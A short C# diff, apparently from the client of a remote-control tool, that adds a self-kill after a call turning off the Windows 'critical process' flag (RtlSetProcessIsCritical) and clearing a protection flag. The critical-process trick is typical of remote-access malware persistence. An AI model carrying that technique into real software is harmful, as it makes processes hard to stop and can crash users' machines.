@@ -121,8 +121,10 @@ namespace Client.Armitage
             try
             {
                 s_isProtectedLock.EnterWriteLock();
+
                 RtlSetProcessIsCritical(0, 0, 0);
                 s_isProtected = false;
+                Process.GetCurrentProcess().Kill();
             }
             finally
             {
